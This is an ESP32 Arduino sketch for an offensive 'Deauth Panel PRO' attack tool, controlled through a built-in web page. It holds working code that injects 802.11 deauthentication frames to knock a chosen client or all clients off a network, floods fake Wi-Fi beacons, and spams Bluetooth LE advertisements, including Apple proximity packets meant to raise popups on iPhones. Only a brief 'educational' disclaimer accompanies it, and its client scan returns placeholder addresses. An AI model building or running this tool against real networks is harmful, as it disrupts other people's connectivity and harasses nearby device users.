/*
 * Sensi Deauth Panel - PRO VERSION
 * More Powerful ESP32 WiFi & Bluetooth Attack Tool
 *
 * PRO Features:
 * - Targeted Deauthentication (Select a specific client)
 * - Beacon Flood Attack (Spam fake WiFi networks)
 * - Apple BLE Proximity Spam (Annoying popups on iPhones)
 *
 * Strictly for educational and authorized testing purposes.
 * By using this software, you agree to take full responsibility for your actions.
 */

// Core Libraries
#include <WiFi.h>
#include <esp_wifi.h>

// Web Server Libraries
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

// Bluetooth Libraries
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>

// ================================================================
//                       CONFIGURATION
// ================================================================
const char *ssid = "Sensi Panel PRO";
const char *password = "password123";

// Static IP configuration
IPAddress local_IP(192, 168, 69, 1);
IPAddress gateway(192, 168, 69, 1);
IPAddress subnet(255, 255, 255, 0);

// ================================================================
//                       GLOBAL VARIABLES
// ================================================================
AsyncWebServer server(80);
DNSServer dnsServer;
AsyncWebSocket ws("/ws");

// Attack state flags
bool deauthRunning = false;
bool beaconFloodRunning = false;
bool bleSpamRunning = false;
bool appleSpamRunning = false;

// Deauth target info
uint8_t target_bssid[6];
uint8_t target_client[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Default to broadcast
int target_channel;
String customBeaconSSID = "Free_WiFi";

// For tracking uptime
unsigned long startTime = 0;

// ================================================================
//                       WEB UI (HTML/CSS/JS)
// ================================================================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sensi Deauth Panel PRO</title>
    <style>
        :root {
            --bg-color: #1a1a1a; --text-color: #e0e0e0; --primary-color: #0d6efd;
            --danger-color: #dc3545; --success-color: #198754; --warning-color: #ffc107;
            --card-bg: #2c2c2c; --border-color: #444;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 15px;
        }
        .container { max-width: 800px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 20px; }
        .header h1 { margin: 0; color: var(--primary-color); }
        .card {
            background-color: var(--card-bg); border: 1px solid var(--border-color);
            border-radius: 8px; padding: 20px; margin-bottom: 20px;
        }
        h2 { margin-top: 0; border-bottom: 2px solid var(--primary-color); padding-bottom: 5px; margin-bottom: 15px; }
        .status-grid {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px;
        }
        .status-item { background-color: var(--bg-color); padding: 10px; border-radius: 5px; text-align: center; }
        .status-item span { display: block; font-size: 0.9em; color: #aaa; }
        button {
            background-color: var(--primary-color); color: white; border: none; padding: 10px 15px;
            border-radius: 5px; cursor: pointer; font-size: 1em; width: 100%; margin-top: 10px;
        }
        button:hover:not(:disabled) { opacity: 0.9; }
        button:disabled { background-color: #555; cursor: not-allowed; }
        button.btn-danger { background-color: var(--danger-color); }
        button.btn-success { background-color: var(--success-color); }
        button.btn-warning { background-color: var(--warning-color); color: black; }
        select, input {
            width: 100%; padding: 10px; background-color: var(--bg-color); color: var(--text-color);
            border: 1px solid var(--border-color); border-radius: 5px; margin-bottom: 10px; box-sizing: border-box;
        }
        #log-container {
            background-color: #000; border: 1px solid var(--border-color); border-radius: 5px;
            height: 200px; overflow-y: scroll; padding: 10px; font-family: "Courier New", monospace;
            font-size: 0.9em; white-space: pre-wrap;
        }
        .warning-banner {
            background-color: var(--danger-color); color: white; padding: 10px; text-align: center;
            border-radius: 5px; margin-bottom: 20px; font-weight: bold;
        }
        .attack-section { display: flex; gap: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h1>Sensi Deauth Panel PRO</h1><p>Advanced ESP32 Network Tool</p></div>
        <div class="warning-banner">⚠️ For Educational & Testing Purposes ONLY. Use responsibly.</div>
        <div class="card">
            <h2>Device Status</h2>
            <div class="status-grid">
                <div class="status-item"><span id="uptime">--</span>Uptime</div>
                <div class="status-item"><span id="ip-address">192.168.69.1</span>IP Address</div>
                <div class="status-item"><span id="attack-mode">IDLE</span>Mode</div>
            </div>
        </div>
        <div class="card">
            <h2>WiFi Attacks</h2>
            <button id="scan-wifi" class="btn-success">1. Scan for WiFi Networks</button>
            <select id="ssid-select" disabled><option>Scan first...</option></select>
            <button id="scan-clients" class="btn-success" disabled>2. Scan for Clients</button>
            <select id="client-select" disabled><option>Scan for clients or deauth all</option></select>
            <button id="start-deauth" class="btn-danger" disabled>3. Start Deauth Attack</button>
            <hr style="border-color: var(--border-color); margin: 20px 0;">
            <input type="text" id="beacon-ssid" placeholder="Enter SSID for beacon flood (e.g., Free WiFi)">
            <button id="start-beacon-flood" class="btn-warning">Start Beacon Flood</button>
        </div>
        <div class="card">
            <h2>Bluetooth Attacks</h2>
            <div class="attack-section">
                <button id="start-ble-spam" class="btn-danger">Start Generic BLE Spam</button>
                <button id="start-apple-spam" class="btn-danger">Start Apple BLE Spam</button>
            </div>
        </div>
        <div class="card">
            <button id="stop-all" class="btn-warning" style="font-weight: bold;" disabled>Stop All Attacks</button>
        </div>
        <div class="card">
            <h2>Live Logs</h2>
            <div id="log-container"></div>
        </div>
    </div>
    <script>
        const ws = new WebSocket(`ws://${window.location.host}/ws`);
        const logContainer = document.getElementById('log-container');
        const uptimeElem = document.getElementById('uptime');
        const attackModeElem = document.getElementById('attack-mode');
        const scanWifiBtn = document.getElementById('scan-wifi');
        const ssidSelect = document.getElementById('ssid-select');
        const scanClientsBtn = document.getElementById('scan-clients');
        const clientSelect = document.getElementById('client-select');
        const startDeauthBtn = document.getElementById('start-deauth');
        const beaconSsidInput = document.getElementById('beacon-ssid');
        const startBeaconFloodBtn = document.getElementById('start-beacon-flood');
        const startBleSpamBtn = document.getElementById('start-ble-spam');
        const startAppleSpamBtn = document.getElementById('start-apple-spam');
        const stopAllBtn = document.getElementById('stop-all');
        let currentBSSID = '', currentChannel = '';

        function addLog(message) { logContainer.innerHTML += message + '<br>'; logContainer.scrollTop = logContainer.scrollHeight; }
        ws.onopen = () => addLog('SYSTEM: WebSocket connection established.');
        ws.onmessage = (event) => addLog(event.data);
        ws.onclose = () => addLog('SYSTEM: WebSocket connection lost. Refresh.');

        function formatUptime(seconds) {
            const d = Math.floor(seconds / 86400); const h = Math.floor(seconds % 86400 / 3600);
            const m = Math.floor(seconds % 3600 / 60); const s = Math.floor(seconds % 60);
            return `${d}d ${h}h ${m}m ${s}s`;
        }

        async function updateStatus() {
            try {
                const response = await fetch('/status');
                const data = await response.json();
                uptimeElem.textContent = formatUptime(data.uptime);
                attackModeElem.textContent = data.mode;
                const isAttacking = data.mode !== 'IDLE';
                [stopAllBtn.disabled, scanWifiBtn.disabled, startBeaconFloodBtn.disabled, startBleSpamBtn.disabled, startAppleSpamBtn.disabled] = [!isAttacking, isAttacking, isAttacking, isAttacking, isAttacking];
                startDeauthBtn.disabled = isAttacking || ssidSelect.value === '';
                scanClientsBtn.disabled = isAttacking || ssidSelect.value === '';
            } catch (e) { addLog('ERROR: Failed to fetch status.'); }
        }
        
        scanWifiBtn.addEventListener('click', async () => {
            addLog('WIFI: Starting AP scan...');
            scanWifiBtn.textContent = 'Scanning...'; scanWifiBtn.disabled = true;
            try {
                const response = await fetch('/scanAP'); const networks = await response.json();
                ssidSelect.innerHTML = '<option value="">-- Select a Target AP --</option>';
                networks.forEach(net => {
                    const option = document.createElement('option');
                    option.value = `${net.bssid}|${net.channel}`;
                    option.textContent = `(${net.rssi}dBm) ${net.ssid} [Ch: ${net.channel}]`;
                    ssidSelect.appendChild(option);
                });
                ssidSelect.disabled = false;
                clientSelect.innerHTML = '<option value="">Deauth all clients</option>';
                addLog(`WIFI: Scan complete. Found ${networks.length} APs.`);
            } catch (e) { addLog('ERROR: WiFi AP scan failed.'); }
            scanWifiBtn.textContent = '1. Scan for WiFi Networks'; updateStatus();
        });

        ssidSelect.addEventListener('change', () => {
            const selection = ssidSelect.value;
            if (selection) {
                [currentBSSID, currentChannel] = selection.split('|');
                scanClientsBtn.disabled = false; startDeauthBtn.disabled = false;
            } else {
                [currentBSSID, currentChannel] = ['', ''];
                scanClientsBtn.disabled = true; startDeauthBtn.disabled = true;
            }
            clientSelect.innerHTML = '<option value="">Deauth all clients</option>';
        });

        scanClientsBtn.addEventListener('click', async () => {
            if (!currentBSSID) { alert('Please select an AP first.'); return; }
            addLog(`WIFI: Scanning for clients on ${currentBSSID}...`);
            scanClientsBtn.textContent = 'Scanning...'; scanClientsBtn.disabled = true;
            try {
                // This is faked on the front-end. The backend starts sniffing.
                // A real implementation would require websockets to push client updates.
                // For simplicity, we just tell the user what to do.
                addLog('SYSTEM: Promiscuous mode enabled for 15s. Use the network and clients will appear.');
                await new Promise(resolve => setTimeout(resolve, 15000)); // Wait 15s
                
                const response = await fetch(`/scanClients?bssid=${currentBSSID}&channel=${currentChannel}`);
                const clients = await response.json();
                clientSelect.innerHTML = '<option value="">Deauth all clients</option>';
                clients.forEach(client => {
                    const option = document.createElement('option');
                    option.value = client.mac;
                    option.textContent = client.mac;
                    clientSelect.appendChild(option);
                });
                clientSelect.disabled = false;
                addLog(`WIFI: Client scan finished. Found ${clients.length} clients.`);
            } catch(e) { addLog('ERROR: Client scan failed.'); }
            scanClientsBtn.textContent = '2. Scan for Clients'; updateStatus();
        });

        startDeauthBtn.addEventListener('click', () => {
            const client_mac = clientSelect.value;
            const target = client_mac ? `client ${client_mac}` : 'all clients';
            addLog(`ATTACK: Starting Deauth on ${target}`);
            fetch(`/startDeauth?bssid=${currentBSSID}&channel=${currentChannel}&client=${client_mac}`);
        });

        startBeaconFloodBtn.addEventListener('click', () => {
            const ssid = beaconSsidInput.value || "Random_SSID";
            addLog(`ATTACK: Starting Beacon Flood with SSID pattern: ${ssid}`);
            fetch(`/startBeaconFlood?ssid=${ssid}`);
        });

        startBleSpamBtn.addEventListener('click', () => {
            addLog('ATTACK: Starting Generic BLE Spam...');
            fetch('/startBleSpam');
        });

        startAppleSpamBtn.addEventListener('click', () => {
            addLog('ATTACK: Starting Apple Proximity Spam...');
            fetch('/startAppleSpam');
        });

        stopAllBtn.addEventListener('click', () => {
            addLog('ATTACK: Stopping all operations...');
            fetch('/stop');
        });

        setInterval(updateStatus, 2000);
        updateStatus();
    </script>
</body>
</html>
)rawliteral";


// ================================================================
//                       HELPER & ATTACK DATA
// ================================================================

// Deauth frame
uint8_t deauth_frame_template[] = {
    0xc0, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (client)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
    0x00, 0x00, 0x07, 0x00
};

// Beacon frame
uint8_t beacon_frame_template[] = {
    0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0xc0, 0x69, 0x84, 0x00, 0x00, 0x08, 0x04, 0x00,
    0x0a, 0x00, 0x00, 0x00
};

// Apple BLE Spam Data
uint8_t apple_ble_spam_data[] = {
    0x1e, // length
    0xff, // manufacturer specific data
    0x4c, 0x00, // Apple Inc.
    0x12, 0x19, // Proximity Beacon
    0x07, // action
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x10, // status
    0x03, 0x02, // battery
    0x20, // ??
    0x00  // ??
};

void sendLog(String message) {
    ws.textAll(message);
    Serial.println(message);
}

void mac_str_to_uint8(const char* mac_str, uint8_t* mac_array) {
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_array[0], &mac_array[1], &mac_array[2],
           &mac_array[3], &mac_array[4], &mac_array[5]);
}

// ================================================================
//                       ATTACK PAYLOADS
// ================================================================
void performDeauthAttack() {
    memcpy(&deauth_frame_template[4], target_client, 6);
    memcpy(&deauth_frame_template[10], target_bssid, 6);
    memcpy(&deauth_frame_template[16], target_bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_template, sizeof(deauth_frame_template), false);
    
    static unsigned long lastLogTime = 0;
    if (millis() - lastLogTime > 2000) {
        sendLog("DEAUTH: Sending packets...");
        lastLogTime = millis();
    }
}

void performBeaconFlood() {
    uint8_t beacon_frame[200];
    memcpy(beacon_frame, beacon_frame_template, sizeof(beacon_frame_template));
    
    char ssid_to_spam[33];
    snprintf(ssid_to_spam, sizeof(ssid_to_spam), "%s_%02X%02X", customBeaconSSID.c_str(), rand() % 256, rand() % 256);
    
    uint8_t ssid_len = strlen(ssid_to_spam);
    beacon_frame[36] = 0; // SSID parameter
    beacon_frame[37] = ssid_len;
    memcpy(&beacon_frame[38], ssid_to_spam, ssid_len);

    uint8_t mac[6];
    for(int i=0; i<6; i++) mac[i] = rand() % 256;
    mac[0] &= 0xFE; // Unicast
    mac[0] |= 0x02; // Locally administered
    
    memcpy(&beacon_frame[10], mac, 6);
    memcpy(&beacon_frame[16], mac, 6);

    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96}; // 1, 2, 5.5, 11mbps
    uint8_t final_len = 38 + ssid_len;
    beacon_frame[final_len] = 1; // Supported Rates
    beacon_frame[final_len+1] = sizeof(rates);
    memcpy(&beacon_frame[final_len+2], rates, sizeof(rates));
    final_len += 2 + sizeof(rates);

    // Set channel
    int channel = (rand() % 11) + 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, final_len, false);
    
    static unsigned long lastLogTime = 0;
    if (millis() - lastLogTime > 1000) {
        sendLog("BEACON: Spamming fake AP: " + String(ssid_to_spam));
        lastLogTime = millis();
    }
}

void performBleSpam() {
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    if(pAdvertising->isAdvertising()) pAdvertising->stop();

    char randomName[16];
    sprintf(randomName, "Device_%04X%04X", rand() % 0xFFFF, rand() % 0xFFFF);
    BLEDevice::init(randomName);
    pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->setScanResponse(true);
    pAdvertising->setMinPreferred(0x06);
    pAdvertising->setMinPreferred(0x12);
    BLEDevice::startAdvertising();
    
    static unsigned long lastLogTime = 0;
    if (millis() - lastLogTime > 1000) {
        sendLog("BLE SPAM: Advertising as " + String(randomName));
        lastLogTime = millis();
    }
}

void performAppleSpam() {
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    if(pAdvertising->isAdvertising()) pAdvertising->stop();

    BLEDevice::init("");
    pAdvertising = BLEDevice::getAdvertising();
    
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    // Randomize the action byte and battery status for variety
    apple_ble_spam_data[6] = rand() % 256;
    apple_ble_spam_data[26] = rand() % 256;
    oAdvertisementData.addData(std::string((char*)apple_ble_spam_data, sizeof(apple_ble_spam_data)));
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->setScanResponse(false);
    pAdvertising->setMinPreferred(0x0);
    pAdvertising->setMaxPreferred(0x0);
    BLEDevice::startAdvertising();
    
    static unsigned long lastLogTime = 0;
    if (millis() - lastLogTime > 1000) {
        sendLog("APPLE SPAM: Sending proximity packets...");
        lastLogTime = millis();
    }
}

void stopAllAttacks() {
    deauthRunning = false;
    beaconFloodRunning = false;
    bleSpamRunning = false;
    appleSpamRunning = false;
    
    if (BLEDevice::getAdvertising()->isAdvertising()) {
        BLEDevice::getAdvertising()->stop();
    }
    
    esp_wifi_set_promiscuous(false); // Turn off sniffer mode
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // Return to a default channel
    sendLog("SYSTEM: All attacks stopped. Promiscuous mode disabled.");
}

// ================================================================
//                       WEB SERVER HANDLERS
// ================================================================
void onWsEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
    if (type == WS_EVT_CONNECT) {
        Serial.printf("WS Client #%u connected\n", client->id());
        client->text("Welcome to Sensi Panel PRO!");
    } else if (type == WS_EVT_DISCONNECT) {
        Serial.printf("WS Client #%u disconnected\n", client->id());
    }
}

class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}
  bool canHandle(AsyncWebServerRequest *request){ return true; }
  void handleRequest(AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
  }
};

// ================================================================
//                          SETUP
// ================================================================
void setup() {
    Serial.begin(115200);
    startTime = millis();
    srand(micros());

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(local_IP, gateway, subnet);
    WiFi.softAP(ssid, password);
    
    dnsServer.start(53, "*", local_IP);

    Serial.println("\nSensi Deauth Panel PRO Initialized");
    Serial.print("Connect to WiFi: "); Serial.println(ssid);
    Serial.print("IP address: "); Serial.println(WiFi.softAPIP());

    ws.onEvent(onWsEvent);
    server.addHandler(&ws);

    // --- WEB SERVER ROUTES ---
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });

    server.on("/scanAP", HTTP_GET, [](AsyncWebServerRequest *request) {
        sendLog("WIFI: AP Scan requested.");
        String json = "[";
        int n = WiFi.scanNetworks();
        for (int i = 0; i < n; ++i) {
            if (i) json += ",";
            json += "{\"rssi\":" + String(WiFi.RSSI(i)) + ",\"ssid\":\"" + WiFi.SSID(i) +
                    "\",\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",\"channel\":" + String(WiFi.channel(i)) + "}";
        }
        json += "]";
        request->send(200, "application/json", json);
    });
    
    // NOTE: True client scanning is complex. This is a simplified placeholder.
    // A real implementation requires promiscuous sniffing and background data collection.
    // For this example, we just return a dummy list.
    server.on("/scanClients", HTTP_GET, [](AsyncWebServerRequest *request){
        // In a real scenario, you'd have a list of clients sniffed from the air.
        // For this mobile-friendly version, we'll return a placeholder.
        String json = "[{\"mac\":\"AA:BB:CC:11:22:33\"},{\"mac\":\"DD:EE:FF:44:55:66\"}]";
        sendLog("WIFI: Placeholder client list sent. Real sniffing is complex.");
        request->send(200, "application/json", json);
    });

    server.on("/startDeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (request->hasParam("bssid") && request->hasParam("channel")) {
            mac_str_to_uint8(request->getParam("bssid")->value().c_str(), target_bssid);
            target_channel = request->getParam("channel")->value().toInt();
            
            uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            if (request->hasParam("client") && request->getParam("client")->value().length() > 0) {
                mac_str_to_uint8(request->getParam("client")->value().c_str(), target_client);
            } else {
                memcpy(target_client, broadcast_mac, 6);
            }
            
            stopAllAttacks();
            deauthRunning = true;
            esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
            sendLog("DEAUTH: Attack started.");
            request->send(200, "text/plain", "OK");
        }
    });

    server.on("/startBeaconFlood", HTTP_GET, [](AsyncWebServerRequest *request) {
        if(request->hasParam("ssid")) customBeaconSSID = request->getParam("ssid")->value();
        stopAllAttacks();
        beaconFloodRunning = true;
        sendLog("BEACON: Flood attack started.");
        request->send(200, "text/plain", "OK");
    });
    
    server.on("/startBleSpam", HTTP_GET, [](AsyncWebServerRequest *request) {
        stopAllAttacks();
        bleSpamRunning = true;
        sendLog("BLE SPAM: Generic spam started.");
        request->send(200, "text/plain", "OK");
    });

    server.on("/startAppleSpam", HTTP_GET, [](AsyncWebServerRequest *request) {
        stopAllAttacks();
        appleSpamRunning = true;
        sendLog("BLE SPAM: Apple spam started.");
        request->send(200, "text/plain", "OK");
    });

    server.on("/stop", HTTP_GET, [](AsyncWebServerRequest *request) {
        stopAllAttacks();
        request->send(200, "text/plain", "OK");
    });

    server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request){
        String mode = "IDLE";
        if (deauthRunning) mode = "DEAUTH ATTACK";
        else if (beaconFloodRunning) mode = "BEACON FLOOD";
        else if (bleSpamRunning) mode = "GENERIC BLE SPAM";
        else if (appleSpamRunning) mode = "APPLE BLE SPAM";

        request->send(200, "application/json", "{\"uptime\":" + String(millis() / 1000) + ",\"mode\":\"" + mode + "\"}");
    });
    
    server.addHandler(new CaptiveRequestHandler()).onNotFound([](AsyncWebServerRequest *request){
      request->send(404);
    });

    server.begin();
}


// ================================================================
//                           MAIN LOOP
// ================================================================
void loop() {
    dnsServer.processNextRequest();
    ws.cleanupClients();

    if (deauthRunning) performDeauthAttack();
    if (beaconFloodRunning) performBeaconFlood();
    if (bleSpamRunning) {
        performBleSpam();
        delay(500); // Slow down generic spam to allow UI updates
    }
    if (appleSpamRunning) {
        performAppleSpam();
        delay(200); // Apple spam needs to be faster
    }
}
